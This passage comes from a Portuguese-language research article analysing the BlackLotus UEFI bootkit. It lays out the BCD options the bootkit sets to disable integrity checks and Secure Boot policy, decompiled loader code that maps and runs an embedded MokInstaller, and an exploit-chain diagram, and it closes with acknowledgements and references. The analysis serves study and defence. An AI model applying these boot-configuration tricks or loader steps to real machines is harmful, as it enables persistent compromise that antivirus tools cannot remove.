    <g2>░░<g1>░<ww>  Windows Boot Manager                                                   ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  --------------------                                                   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  identifier              {bootmgr}                                      <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  description             Windows Boot Manager                           ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  locale                  en-US                                          <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  inherit                 {globalsettings}                               <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  bootdebug               No                                             <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  displayorder            {527f84fc-036e-11ec-abb0-005056c00008}         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  timeout                 30                                             ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  Windows Boot Loader                                                    ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  -------------------                                                    ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  identifier              {527f84fc-036e-11ec-abb0-005056c00008}         ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  device                  boot                                           ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  path                    \system32\hvloader.efi &lt;---                    <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  description             Hoy la disco se flota                          <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  locale                  en-US                                          ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  inherit                 {bootloadersettings}                           ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  truncatememory          0x10000000 &lt;---                                ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  avoidlowmemory          0x1000                                         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  nointegritychecks       Yes &lt;---                                       <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  testsigning             Yes &lt;---                                       ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  isolatedcontext         Yes                                            ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  osdevice                boot                                           <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  systemroot.             \                                              <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  ems                     Yes                                            ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   ㄴ Devido às opções carregadas do BCD, a política de SecureBoot        <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>   foi apagada da memória, permitindo que o bootmgr.efi agora            ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   carregasse outra aplicação vulnerável implantada pelo                 <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   instalador: hvloader.efi;                                             <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>   ㄴ Durante sua execução, o hvloader.efi carrega e executa a            <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   mcupdate_*.dll;                                                       <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>   ㄴ A DLL executa um MokInstaller integrado, iniciando assim a          ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   fase de persistência e finalizando a exploração do bug.               ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>      hvloader.efi                                                       ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   unsigned __int64 __fastcall BtLoadUpdateDll(__int64 a1,               ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>    └►_QWORD *imageEP) {                                                 ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>     platform = 0i64;                                                    <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>     BtpUpdateDllImagePages = 0i64;                                      <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>     v9[1] = v9;                                                         ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>     v9[0] = v9;                                                         <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>     // Identifica a plataforma baseada no CPUID                         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>     status = BtpIdentifyPlatform(a1, &amp;platform);                        ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>     if …                                                                ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>      mcupdate_filename = *(platform + 16);                              <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>     if …                                                                <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>       // Carrega a imagem do                                            <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>       //&lt;dispositivo&gt;                                                   ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>       //:\\&lt;systemroot&gt;\system32\mcupdate_&lt;platform&gt;.dll                ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>     status = BtpLayoutImage(mcupdate_filename, v10, &amp;image, v9,         <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>     └► &amp;platform, a1, 1);                                               <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>     v7 = *(platform + 0x30);                                            <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>     BtpUpdateDllImagePages = v7;                                        <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>     if (status) {                                                       <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>       // Erro, chamar gHvlpInvalidHypervisorImage                       <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>       (*(a1 + 0x78))(L”\\SystemRoot\\system32\\”, *(platform + 16));    <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>     } else {                                                            <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>       image.ImageBase = v7;                                             ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>       BtpProcessImageLoadConfig(v10, &amp;image.ImageBase, v7, 0);          <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>       *imageEP = BtpUpdateDllImagePages + image.AddressOfEntryPoint;    ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>     }                                                                   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   }                                                                     <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>   mcupdate_*.dll                                                        <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>   // Verifica se a imagebase do hvloader foi encontrada checando se o   ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   // IMAGE_NT_HEADERS64.OptionalHeader.CheckSum é igual à 0xEC35E       ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   if (*(*(HvloaderImageBase + 0x3C) + HvloaderImageBase + 0x58) ==      ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                     0xEC35E) {                                          <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>     EfiImageHandle = *(HvloaderImageBase + 0x113670);                   <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>     BlpArchSwitchContext = HvloaderImageBase + 0xC550;                  <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>     if (EfiImageHandle) {                                               <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>       EfiST = *(HvloaderImageBase + 0x1136C8);  // achar o              ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>       //ponteiro para EFI_SYSTEM_TABLE                                  <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>       if (EfiST) {                                                      <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>         // BlImgAllocateImageBuffer                                     <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>         if (((HvloaderImageBase + 0x3CC0C))(                            ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>           &amp;ImageBase, MINtHdrs-&gt;OtionalHeader.SizeOfImage,              <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                                                  └►0xE0000012i64,       <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>           0x424000i64, 0, 1) &gt;= 0 &amp;&amp;                                    <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>             ImageBase) {                                                ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>           // Copiar os headers do MokInstaller na                       <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>           //memória alocada                                             ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>           for (i = 0i64;                                                <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                          i &lt; MINtHdrs-&gt;OptionalHeader.SizeOfHeaders,    <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>                                               └►++i) *                  <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>               (i + ImageBase) = gMokInstallEfiApp[i];                   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>           j = 0;                                                        <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>           // Copiar o resto dos dados para memória alocada              <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>           for (v1 = MINtHdrs +                                          <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>           └►MINtHdrs-&gt;FileHeader.SizeOfOptionalHeader;                  <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>                        j &lt; MINtHdrs-&gt;FileHeader.NumberOfSections; ++j) {·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>             if…  // Copiar o resto dos dados para a memória alocada     <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>           }                                                             ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>           if (MINtHdrs-&gt;OptionalHeader.AddressOfEntryPoint)             <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>             // Executar o EntryPoint do MokInstaller                    ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>             ((ImageBase +                                               <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>              └►MINtHdrs-&gt;OptionalHeader.AddressOfEntryPoint))(          <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                 EfiI mageHandle, EfiST, BlpArchSwitchContext);          <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>         }                                                               ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>       }                                                                 <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>     }                                                                   <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   }                                                                     ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  ㄴ Exploração resumida                                                  <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  bootmgfw.efi                                                           <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [+] BCD (ESP:\EFI\Microsoft\Boot\)                                     <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>      |                                                                  <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>      +------&gt; bootgmr.efi                                               <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>               - avoidlowmemory:0x10000000                               ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>               - custom: 22000023                                        <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                             | bootmgr.efi                               <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>                             +----&gt; [+] BCD (ESP:\system32\)             ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>                                     - path: \system32\hvloder.efi --+   ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                     - truncatememory: 0x10000000    |   ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                     - nointegritychecks: Yes        |   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                     - testsigning: Yes              |   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                                                     |   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  persistência &lt;------ mcupdate_*.dll &lt;------ hvloader.efi &lt;---------+   ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  ㄴ Impacto final do bootkit                                             ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  Uma vez que o malware executa o exploit e a persistência na máquina    <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  da vítima (vale lembrar que o malware fica localizado no file system   ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  como uma aplicação UEFI), ele procede para funcionar como um HTTP      ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Loader, mantendo comunicação com servidor de C&amp;C (ou C2, pros mais     <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  chegados). De acordo com o criador, as máquinas infectadas eram        <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  controladas por uma interface web e usadas como bots para o que o      <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  operador daquele malware quisesse usar. Por se tratar de uma           <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  persistência em um nível tão baixo, AVs não seriam capazes de          <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  detectá-lo e removê-lo.                                                ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  Mais recentemente (12 de Julho de 2023) o suposto código do            <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  BlackLotus foi vazado no GitHub[9], e embora ele utilize outro         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  exploit que não o Baton Drop, pesquisadores como o Alex Matrosov[10]   <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  afirmam realmente se tratar do bootkit original, e que as funções de   ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  carregamento da UEFI, infecção e pós-exploração permanecem             <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  inalterados.                                                           ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [*]--------------------------------------------------------------[*]   <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   | 4. Agradecimentos e referências                                |    ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [*]--------------------------------------------------------------[*]   <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  Chegamos ao fim deste artigo, e tudo que eu posso falar é obrigado     ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  por ter lido até aqui. Essa pesquisa foi o resultado de pelo menos 3   <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  meses de pesquisa sobre diversos assuntos que eu nunca sequer tinha    ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  chegado perto de estudar antes, e realmente deu bastante trabalho,     ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  mas como tudo de bom nessa vida, nada vem fácil ;]                     <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  “Meses do meu trabalho, pra alguns minutos do seu entretenimento”      <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  Tem algumas pessoas que eu faço questão de agradecer, tanto pela       ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  inspiração para realizar essa pesquisa quanto por ajuda técnica        <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  durante o processo de estudo:                                          ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   - rodnt: Se não fosse por você, eu não estaria onde eu tô hoje,       ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   tanto literalmente quanto hipoteticamente. Você confiou em mim        ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   quando ninguém mais confiava e me deu um ponta pé inicial que         <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>   eu jamais vou poder retribuir. Não sei o que você viu ou vê em        <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>   mim que te faz achar que eu sou digno de tanta ajuda que você         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>   me deu e dá, mas eu prometo que vou continuar estudando pra           ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   ser essa pessoa que você vê em mim :]                                 <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   - fxo: Você pode achar que não ajudou muito, mas o simples fato       <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>   de ter confiado em mim com as ideias pra fazer essa pesquisa          ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   já é uma ajuda imensurável. Por mais que quem tenha feito a           <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   pesquisa fui eu, a ideia dela veio de você, e ter achado que          <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>   eu seria capaz de efetuá-la já é muito pra mim. Talvez você           ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   não goste quando as pessoas digam isso, mas você é uma enorme         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   inspiração pra mim :]                                                 <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>   - Wack0: Já começa que se não fosse por você, essa pesquisa não       <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   existiria, uma vez que ela é toda construída nos seus estudos,        <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>   mas além disso, durante o processo de análise da CVE, eu              ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   encontrei algumas dificuldade por se tratar de um assunto             <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   completamente novo pra mim, e te pingar no mastodon com               ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   algumas dúvidas sem a mínima expectativa de resposta, você me         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   respondeu em menos de 5min, respondendo todos os meus                 <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>   questionamentos e me ajudando a entender melhor a sua                 <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   pesquisa. Você não tinha a mínima obrigação de me ajudar, mas         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>   fez mesmo assim no mesmo instante, humilde :D                         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  Tem bem mais gente que eu gostaria de agradecer e que são tão          <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  importantes quanto os que eu citei aqui, mas se eu fosse citar todo    ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  mundo, dava pra fazer um artigo só disso :]                            ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  [1]<a href="https://haqueers.com/@Rairii">https://haqueers.com/@Rairii                                        </a><g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  [2]<a href="https://twitter.com/hasherezade">https://twitter.com/hasherezade                                     </a><g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  [3]<a href="https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3435305/nsa-releases-guide-to-mitigate-blacklotus">https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Re   </a><g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  <a href="https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3435305/nsa-releases-guide-to-mitigate-blacklotus">lease-View/Article/3435305/nsa-releases-guide-to-mitigate-blacklotus   </a>░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  <a href="https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3435305/nsa-releases-guide-to-mitigate-blacklotus">-threat/                                                               </a>·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [4]<a href="https://www.youtube.com/watch?v=U02ClZS8hqw">https://www.youtube.com/watch?v=U02ClZS8hqw                         </a><g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  [5]<a href="https://www.bleepstatic.com/images/news/u/1109292/2022/BlackLotus_promo.png">https://www.bleepstatic.com/images/news/u/1109292/2022/BlackLotus   </a>░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  <a href="https://www.bleepstatic.com/images/news/u/1109292/2022/BlackLotus_promo.png">_promo.png                                                             </a>·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  [6]<a href="https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/">https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit   </a>·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  <a href="https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/">-myth-confirmed/                                                       </a>░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  [7]<a href="https://twitter.com/smolar_m">https://twitter.com/smolar_m ||                                     </a>░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  <a href="https://www.welivesecurity.com/en/our-experts/martin-smolar/">https://www.welivesecurity.com/en/our-experts/martin-smolar/           </a>░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [8]<a href="https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control">https://book.hacktricks.xyz/windows-hardening/authentication-cr     </a>·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  <a href="https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control">entials-uac-and-efs/uac-user-account-control                           </a><g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [9]<a href="https://github.com/ldpreload/BlackLotus">https://github.com/ldpreload/BlackLotus                             </a>·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [10]<a href="https://twitter.com/matrosov">https://twitter.com/matrosov                                       </a><g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [11]<a href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch4021_intro_UEFI+2023_v1/course/">https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch4   </a>░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  <a href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch4021_intro_UEFI+2023_v1/course/">021_intro_UEFI+2023_v1/course/                                         </a><g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  [12]<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/bringup/boot-and-uefi">https://learn.microsoft.com/en-us/windows-hardware/drivers/bring   </a><g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/bringup/boot-and-uefi">up/boot-and-uefi                                                       </a><g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [13]<a href="https://eclypsium.com/research/theres-a-hole-in-the-boot/">https://eclypsium.com/research/theres-a-hole-in-the-boot/          </a><g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [14]<a href="https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-secure-boot">https://learn.microsoft.com/en-us/windows-hardware/design/device   </a><g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  <a href="https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-secure-boot">-experiences/oem-secure-boot                                           </a><g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [15]<a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/system-security/secure-the-windows-10-boot-process">https://learn.microsoft.com/en-us/windows/security/operating-sys   </a><g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  <a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/system-security/secure-the-windows-10-boot-process">tem-security/system-security/secure-the-windows-10-boot-process        </a>░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  [16]<a href="https://www.binarly.io/posts/The_Untold_Story_of_the_BlackLotus_UEFI_Bootkit/index.html">https://www.binarly.io/posts/The_Untold_Story_of_the_BlackLotus_   </a><g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  <a href="https://www.binarly.io/posts/The_Untold_Story_of_the_BlackLotus_UEFI_Bootkit/index.html">UEFI_Bootkit/index.html                                                </a>░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [17]<a href="https://uefi.org/">https://uefi.org/                                                  </a><g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [18]<a href="https://media.blackhat.com/us-13/us-13-Bulygin-A-Tale-of-One-Software-Bypass-of-Windows-8-Secure-Boot-Slides.pdf">https://media.blackhat.com/us-13/us-13-Bulygin-A-Tale-of-One-Sof   </a><g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  <a href="https://media.blackhat.com/us-13/us-13-Bulygin-A-Tale-of-One-Software-Bypass-of-Windows-8-Secure-Boot-Slides.pdf">tware-Bypass-of-Windows-8-Secure-Boot-Slides.pdf                       </a>·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [19]Babar, Y. Hands-on Booting: Learn the Boot Process of Linux,       <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Windows, and Unix. Apress, 2020.                                       <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [20]Yao, J., Zimmer, V. Building Secure Firmware: Armoring the         <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  Foundation of the Platform. Apress, 2020.                              ░<g1>░<g2>░<g1><ww>
    ··░                                                                         ░··
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                

</div></pre>
</body>
</html>
